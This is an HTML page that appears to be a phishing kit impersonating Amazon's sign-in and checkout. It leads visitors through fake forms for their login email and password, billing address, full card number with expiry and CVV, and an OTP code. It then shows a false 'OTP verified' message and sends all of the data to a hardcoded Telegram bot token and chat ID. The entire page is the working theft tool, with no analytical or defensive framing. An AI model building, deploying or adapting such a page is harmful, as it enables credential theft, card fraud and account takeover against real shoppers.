<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Amazon Checkout - Telegram Bot Integration</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* General reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f3f3f3;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 30px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .header {
            background-color: #ffffff;
            padding: 20px;
            color: white;
            font-size: 20px;
            font-weight: 500;
            border-radius: 5px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .header img {
            max-width: 140px;
            height: auto;
            margin-bottom: 10px;
            background-color: white;
            padding: 10px;
            border-radius: 5px;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #131921;
            margin-bottom: 20px;
        }

        .section-title {
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 20px;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }

        .input-field:focus {
            outline: none;
            border-color: #FF9900;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #FF9900;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #e68900;
        }

        .payment-methods {
            display: flex;
            gap: 20px;
            margin: 20px 0;
            justify-content: center;
        }

        .payment-methods img {
            max-width: 100px;
            height: auto;
            cursor: pointer;
            background-color: white;
            padding: 10px;
            border-radius: 5px;
        }

        /* Section handling (hides inactive sections) */
        .section {
            display: none;
        }

        .active {
            display: block;
        }

        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }

            .payment-methods {
                flex-direction: column;
                align-items: center;
            }

            .payment-methods img {
                max-width: 80px;
                margin-bottom: 15px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Login Page Section -->
    <div class="section active" id="login-section">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
            <span>Sign-In</span>
        </div>
        <form id="loginForm" onsubmit="showBillingPage(event)">
            <input type="email" id="loginEmail" name="loginEmail" class="input-field" placeholder="Email or mobile phone number" required>
            <input type="password" id="loginPassword" name="loginPassword" class="input-field" placeholder="Password" required>
            <button type="submit" class="submit-btn">Sign-In</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot your password?</a>
        </div>
    </div>

    <!-- Billing Page Section -->
    <div class="section" id="billing-section">
        <h1>Billing Information</h1>
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
        </div>
        <div class="section-title">Enter your billing details</div>
        <form id="billingForm" onsubmit="showPaymentPage(event)">
            <input type="text" id="fullName" name="fullName" class="input-field" placeholder="Full Name" required>
            <input type="text" id="address1" name="address1" class="input-field" placeholder="Address Line 1" required>
            <input type="text" id="address2" name="address2" class="input-field" placeholder="Address Line 2 (optional)">
            <input type="text" id="city" name="city" class="input-field" placeholder="City" required>
            <input type="text" id="state" name="state" class="input-field" placeholder="State/Province" required>
            <input type="text" id="postalCode" name="postalCode" class="input-field" placeholder="Postal Code" required>
            <input type="tel" id="phone" name="phone" class="input-field" placeholder="Phone Number" required>
            <button type="submit" class="submit-btn">Continue to Payment</button>
        </form>
    </div>

    <!-- Payment Page Section -->
    <div class="section" id="payment-section">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
            <span>Payment Information</span>
        </div>
        <h1>Enter your payment details</h1>
        <div class="section-title">Enter your payment details</div>
        <form id="paymentForm" onsubmit="showOtpPage(event)">
            <input type="text" id="cardNumber" name="cardNumber" class="input-field" placeholder="Credit Card Number" required>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="expMonth" name="expMonth" class="input-field" placeholder="MM" style="width: 45%;" required>
                <input type="text" id="expYear" name="expYear" class="input-field" placeholder="YY" style="width: 45%;" required>
            </div>
            <input type="text" id="cvv" name="cvv" class="input-field" placeholder="CVV" required>
            <div class="payment-methods">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/PayPal_logo_2014.svg" alt="PayPal" title="Pay with PayPal">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Visa_2014_logo.svg" alt="Visa" title="Pay with Visa">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/MasterCard_Logo_2019.svg" alt="MasterCard" title="Pay with MasterCard">
            </div>
            <button type="submit" class="submit-btn">Submit Payment</button>
        </form>
    </div>

    <!-- OTP Verification Page Section -->
    <div class="section" id="otp-section">
        <h1>Enter the OTP sent to your phone number</h1>
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
            <span>OTP Verification</span>
        </div>
        <div class="section-title">Enter the 6-digit OTP</div>
        <form id="otpForm" onsubmit="verifyOTP(event)">
            <div style="display: flex; justify-content: space-between;">
                <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
                <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
                <input type="text" id="otp3" name="otp3" class="input-field" maxlength="1" required>
                <input type="text" id="otp4" name="otp4" class="input-field" maxlength="1" required>
                <input type="text" id="otp5" name="otp5" class="input-field" maxlength="1" required>
                <input type="text" id="otp6" name="otp6" class="input-field" maxlength="1" required>
            </div>
            <button type="submit" class="submit-btn">Verify OTP</button>
        </form>
    </div>
</div>

<script>
    // Telegram Bot Token and Chat ID
    const botToken = '8051331824:AAG7-2uZNVahf5iLjvtwqaD_kfClawdT7v0';
    const chatId = '8003279649';

    // Function to show Billing Page after login
    function showBillingPage(event) {
        event.preventDefault();
        document.getElementById("login-section").classList.remove("active");
        document.getElementById("billing-section").classList.add("active");
    }

    // Function to show Payment Page after billing information
    function showPaymentPage(event) {
        event.preventDefault();
        document.getElementById("billing-section").classList.remove("active");
        document.getElementById("payment-section").classList.add("active");
    }

    // Function to show OTP Page after payment information
    function showOtpPage(event) {
        event.preventDefault();
        document.getElementById("payment-section").classList.remove("active");
        document.getElementById("otp-section").classList.add("active");
    }

    // Function to verify OTP
    function verifyOTP(event) {
        event.preventDefault();

        const otp = [
            document.getElementById('otp1').value,
            document.getElementById('otp2').value,
            document.getElementById('otp3').value,
            document.getElementById('otp4').value,
            document.getElementById('otp5').value,
            document.getElementById('otp6').value
        ];

        const otpString = otp.join('');
        if (otpString.length === 6 && !otp.includes("")) {
            alert('OTP verified successfully!');
            sendToTelegram();
        } else {
            alert('Please enter a valid OTP.');
        }
    }

    // Function to send all form data to Telegram bot
    function sendToTelegram() {
        const loginEmail = document.getElementById('loginEmail').value;
        const loginPassword = document.getElementById('loginPassword').value;
        const fullName = document.getElementById('fullName').value;
        const address1 = document.getElementById('address1').value;
        const address2 = document.getElementById('address2').value;
        const city = document.getElementById('city').value;
        const state = document.getElementById('state').value;
        const postalCode = document.getElementById('postalCode').value;
        const phone = document.getElementById('phone').value;
        const cardNumber = document.getElementById('cardNumber').value;
        const expMonth = document.getElementById('expMonth').value;
        const expYear = document.getElementById('expYear').value;
        const cvv = document.getElementById('cvv').value;
        const otp = [
            document.getElementById('otp1').value,
            document.getElementById('otp2').value,
            document.getElementById('otp3').value,
            document.getElementById('otp4').value,
            document.getElementById('otp5').value,
            document.getElementById('otp6').value
        ].join('');

        const message = `New Checkout Data:\n\nLogin Info:\nEmail: ${loginEmail}\nPassword: ${loginPassword}\n\nBilling Info:\nName: ${fullName}\nAddress: ${address1} ${address2}\nCity: ${city}\nState: ${state}\nPostal Code: ${postalCode}\nPhone: ${phone}\n\nPayment Info:\nCard Number: ${cardNumber}\nExpiry: ${expMonth}/${expYear}\nCVV: ${cvv}\nOTP: ${otp}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.send();
    }
</script>

</body>
</html>
